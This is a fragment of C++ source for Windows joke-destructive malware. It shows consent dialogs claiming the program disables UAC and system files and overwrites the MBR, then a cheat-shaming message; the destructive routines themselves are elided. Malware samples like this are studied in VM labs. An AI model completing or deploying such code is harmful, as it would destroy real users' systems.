...
{
	INT32 warning = MessageBoxA(0, "The program you just executed is considered a Trojan Win32\r\n"
		"and has full capacity to disable system files, disable the\r\n"
		"admin permissions(UAC), and overwrite the mbr(Boot Sector)\r\n"
		"If you don't know what this malware does, Simply press the\r\n"
		"Cancel button and nothing will happen, If you know what it\r\n"
		"does and you are using a VM, you can continue, please make\r\n"
		"sure that you downloaded this from the github: ZeroCyber32\r\n"
		"and you are using a VM so your real pc doesn't get damaged\r\n"
		"very badly\r\n"
		"\r\n"
		"Are you sure you want to run this malware? Once you run it\r\n"
		"your PC will die(by ZeroCyber and pankoza2.0)", "Malware Warning", MB_OKCANCEL | MB_ICONEXCLAMATION);
	if (warning == IDOK)
	{
		INT32 question = MessageBoxA(0, "If you have read the previous warning, Then\r\n"
			"you keep in mind that your pc will die when\r\n"
			"you execute this file\r\n"
			"\r\n"
			"ARE YOU REALLY SURE YOU WANT TO EXECUTE THE\r\n"
			"SOFTWARE? I AM NOT RESPONSIBLE FOR WHATEVER\r\n"
			"HAPPENS TO YOUR PC\r\n", "Final Warning", MB_OKCANCEL | MB_ICONEXCLAMATION);
		if (question == IDOK)
		{
			...
			message << "You shouldn't download cheats" << std::endl;
			message.close();
